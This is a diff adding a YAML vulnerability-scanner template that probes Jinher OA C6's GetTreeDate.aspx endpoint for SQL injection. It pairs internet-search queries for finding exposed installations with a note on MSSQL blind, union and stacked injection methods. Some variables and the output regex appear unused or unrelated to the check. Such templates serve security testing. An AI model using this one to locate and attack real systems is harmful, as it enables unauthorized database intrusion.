@@ -1,0 +1,40 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Jinher-OA"
+    hunter-query: app.name="金和 OA"
+    quake-query: app:"金和OA"
+    zoomeye-query: app:"金和OA"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: mssql 时间盲注 | 联合查询 | 布尔盲注 | 叠堆注入
+
+name: poc-yaml-jinhe-c6-GetTreeDate.aspx-sqli
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1
+      follow_redirects: false
+      headers: 
+      body: 
+    expression: >-
+      response.status == 200 && response.body_string.contains("GetTreeDate.aspx") && response.body_string.contains("permissions")
+
+    output:
+      search: |-
+        "(?P<path>.+)/webapps".bsubmatch(response.body)
+      path: search["path"]
+
+expression: r0() 
